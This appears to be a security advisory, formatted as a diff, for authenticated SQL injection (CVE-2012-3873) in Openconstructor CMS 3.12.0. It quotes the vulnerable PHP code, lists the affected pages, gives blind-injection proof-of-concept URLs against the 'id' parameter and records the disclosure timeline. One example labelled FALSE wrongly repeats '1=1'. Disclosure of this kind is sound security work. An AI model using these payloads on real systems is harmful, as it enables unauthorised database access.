@@ -1,0 +1,74 @@
+###Title###: 
+Openconstructor CMS 3.12.0 'id' parameter multiple SQL injection vulnerabilities
+
+
+###Affected Software###:
+http://www.openconstructor.org/
+http://code.google.com/p/openconstructor/downloads/list
+http://esectorsolutions.com/about/whats-new/esector-news/detailed/?id=234
+
+
+###Description###: 
+Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP.
+Multiple SQL injection vulnerabilities exist on the 'id' parameter, which is used across different sections of the application. 
+Verson 3.12.0 is vulnerable, previous version may be affected, but they have not been tested.
+
+###CVE###
+CVE-2012-3873
+
+
+###Impact###: 
+Authenticated attackers can execute arbitrary SQL queries.
+
+CVSS Base Score: 9.0 (AV:N/AC:L/Au:S/C:C/I:C/A:C)
+
+
+###Credits###:
+Lorenzo Cantoni 
+
+
+###Details###:
+The following lines of code are the cause of the issue:
+
+  ds->get_record($_GET['id'])
+
+get_record() perform a query on the database, without checking the user supplied data in the 'id' parameter. The following pages are vulnerable:
+
+data/gallery/edit.php
+data/guestbook/edit.php
+data/file/edit.php
+data/htmltext/edit.php
+data/publication/edit.php
+data/event/edit.php
+
+'getimage/showimage.php' is also vulnerable, due to the following lines of code:
+
+$res = $db->query(
+                'SELECT id, name, filename, size, type, date'.
+                ' FROM dsfile'.
+                ' WHERE id='.$_GET['id']
+    );
+
+
+###Proof of Concept###:
+An object (eg:gallery object, file object, guestbook object ...) must first be created or has to already exist in order to exploit the vulnerability.
+For instance, if a guestbook object has been created, an attacker can open it in edit page and exploit a blind SQL injection as follows:
+
+http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a TRUE value for the query
+http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a FALSE value for the query
+
+In my test environment, I have been able to confirm the possibility to execute queries with the following commands:
+
+http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)='5.5.16-log' #returns a TRUE value for the query
+http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)='5.5.16-foo' #returns a FALSE value for the query
+
+On 'getimage/showimage.php', an image file must be first successfully uploaded. The exploitation is very similar:
+
+http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-foo' # returns a FALSE value for the query
+http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-log' # return a TRUE value for the query
+
+
+###Disclosure###
+[08/07/2012] Lead Developer contacted.
+[22/07/2012] No response. Sent another mail.
+[04/08/2012] Still no response. Public disclosure.
